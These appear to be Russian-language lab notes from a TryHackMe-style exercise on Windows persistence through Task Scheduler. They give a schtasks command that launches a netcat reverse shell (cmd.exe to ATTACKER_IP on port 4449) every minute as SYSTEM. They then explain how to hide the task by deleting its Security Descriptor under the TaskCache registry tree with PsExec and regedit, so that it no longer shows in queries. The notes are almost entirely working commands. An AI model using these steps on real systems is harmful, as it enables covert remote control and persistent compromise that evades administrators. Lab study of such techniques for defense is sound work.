# Task Scheduler
# Можем создать задачу и контролировать ее запуск( аналог cron ).

## 1. Создаем задачу с rev-shell, которая будет выполнятся каждую минуту
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
## 2. Проверяем, что задача создана
schtasks /query /tn thm-taskbackdoor

#### Making Our Task Invisible #### 
# Чтобы вредоносная задача стала незаметной нужно удалить ее Security Descriptor (SD)
# Удаление SD эквиваленто запрету на просмотр текущей таски для всех юзеров.

## 1. Используем psexec
PsExec64.exe -s -i regedit
## 2. Находим древо тасок
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
## 3. Находим св-во SD > delete.
## 4. Проверяем таску, а ее как будто не существует, а shell на listener придет
schtasks /query /tn thm-taskbackdoor